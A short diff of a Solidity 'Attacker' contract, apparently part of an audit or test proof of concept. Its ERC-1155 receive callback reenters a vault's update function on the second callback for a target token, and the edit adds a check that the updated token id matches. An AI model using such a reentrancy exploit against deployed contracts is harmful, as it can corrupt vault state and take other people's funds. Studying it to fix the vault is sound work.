@@ -42,12 +42,13 @@ contract Attacker is IERC1155Receiver  {
         address ,
         address ,
         uint256 id,
-        uint256 value,
+        uint256 ,
         bytes calldata 
     ) external override returns (bytes4) {
         counter++;
         if(target_id == id && counter == 2){
-            vault.update(target_id, 1, 1e18);
+            uint256 updated_id = vault.update(target_id, 1, 1e18);
+            require(target_id == updated_id, "updated value of different token id");
         }
     
 
